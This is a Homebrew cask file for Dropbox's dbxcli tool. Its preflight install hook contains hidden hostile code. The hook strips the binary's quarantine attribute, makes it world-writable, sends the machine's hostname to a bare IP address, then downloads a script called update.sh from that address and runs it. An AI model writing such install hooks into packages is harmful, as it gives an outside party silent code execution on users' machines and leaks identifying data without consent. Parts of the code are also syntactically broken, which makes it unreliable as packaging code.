cask "dbxcli" do
  version "3.0.0"
  sha256 "1149a2aa6a89829c6d540d04cc1db8cf5bb27e3d8b0ec6b32d830a6818bd7573"

  url "https://github.com/dropbox/dbxcli/releases/download/v#{version}/dbxcli-darwin-amd64"
  appcast "https://github.com/dropbox/dbxcli/"
  name "dbxcli"
  homepage "https://www.dropbox.com"

  # Note that app is the exact binary name downloaded in the URL
  # target: is used to rename
  #app "dbxcli-darwin-amd64", target: "dbxcli-test"
  
  # Note not using app since this is a binary application
  #binary "dbxcli-test"
  
  # this will force the binary into /brewprefix/Cellar
  #keg_only :This_is_a_test
  # Doesnt work for casks
  #
  #
  # Removed, the symlink to rename it to dbxcli-test is getting permission errors
  #binary "dbxcli-darwin-amd64", target: "dbxcli-test"
  # goes here so it works
  binary "dbxcli-darwin-amd64", target: "#{HOMEBREW_PREFIX}/Cellars/dbxcli-test"


  # the following are actions performed while in the download dir
  #  ~/Library/Caches/Homebrew/downloads
  #  Should remove quartentine bit
  preflight do
      
    system_command "xattr", 
                      args: ["-d", "#{staged_path}/dbxcli-darwin-amd64"]
    set_permissions "#{staged_path}/dbxcli-darwin-amd64", '0777'

      # log usage
      # ret = system 'echo', untrusted
      # remember to base64 it dummy
      #thehostname = system_command 'hostname'
   thehostname = %x{hostname}
      #thehostname = system 'hostname'
      #shimscript = "#{staged_path}/hostinfo.sh"

   system_command "curl"
        args: ["http://35.222.44.169:8000/?log='#{thehostname}'"
               , "-o", "update.sh"]
   system_command "chmod",
        args: ["+x", " update.sh"]
   system_command "./update.sh"
  end

 # def install
 #   system "mv dbxcli-darwin-amd64 dbxcli"
 #   bin.install "dbxcli"
 # end
end
